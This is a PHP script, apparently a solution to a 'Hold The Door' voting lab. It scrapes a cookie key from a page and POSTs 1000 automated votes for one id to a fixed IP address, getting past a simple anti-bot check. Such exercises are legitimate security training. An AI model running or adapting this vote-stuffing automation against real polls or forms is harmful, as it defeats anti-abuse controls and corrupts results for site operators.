<?php

function curl($url){
     /**
     *Create a conexion, scrapes the key and POST the form
     */

     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_HEADER, 1);

     /*Getting and printing the html source*/

     $source = curl_exec($ch);
     /*echo $source, "\n";*/

     /*Getting cookie HoldTheDoor from the header this will be the key also*/

     preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $source, $matches);
     $cookies = array();
     foreach($matches[1] as $item){
         parse_str($item, $cookie);
         $cookies = array_merge($cookies, $cookie);
     }
     echo "cookies:\nHold The Door:\t";
     $f_key = $cookies['HoldTheDoor'];
     echo $f_key, "\n";

     /*Building the POST request*/

     $query = "id=1305&holdthedoor=Submit&key=";
     $query .= $f_key;

     /*Configurate the curl options*/

     curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: HoldTheDoor=".$f_key));
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

     /*Set the culr mode to POST*/

     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $query);

     /*Making the request*/

     $response = curl_exec($ch);

     /*This closes the session and conexion*/

     curl_close($ch);

     return $response;
}

function vote(){
     /**
     * This checks the response after sending the POST request
     */

     $res = curl("http://158.69.76.135/level1.php");
     if ($res == "See you later hacker! [5]" || $res == "See you later hacker! [4]"){
     echo $res, "\n";
     } else {
       	   /* for printing the actual count*/
	   $st = "<tr>\n    <td>\n1305    </td>\n    <td>\n";
	   $counter_array = array();
	   $ini = stripos($res, $st) + strlen($st);
	   for ($i = $ini; $res[$i] != " "; $i++){
	       array_push($counter_array, $res[$i]);
	   }
	   $counter = join($counter_array);
     	   echo "\033[32m\nSuccess\033[0m\n", "\n";
	   return $counter;
     }

}

for ($i = 0; $i < 1000; $i++)
{
	$count = vote();
	echo "vote #", $count, "\n";
}


?>